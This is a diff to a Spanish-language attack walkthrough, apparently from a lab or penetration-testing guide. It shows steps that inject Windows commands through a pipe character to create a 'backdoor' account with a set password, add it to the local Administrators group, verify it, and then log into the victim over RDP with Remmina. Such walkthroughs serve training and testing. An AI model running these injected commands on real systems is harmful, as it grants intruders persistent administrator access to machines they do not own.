@@ -312,7 +312,8 @@
  5. Para crearnos un usuario utilizamos el comando "| net user backdoor P4$$w0rd /add". IMPORTANTE: Indicar la contraseña para la creación del usuario.
  6. Comprobar que se ha creado el usuario, "| net user".
  7. Añadimos al usuario que hemos creado al grupo Local de Administradores con el comando "| net localgroup Administrators backdoor /add".
- 
+ 8. Lo comprobamos con "| net user backdoor".
+ 9. Para entrar con RDP a la víctima utilizamos remmina.
 
  
  
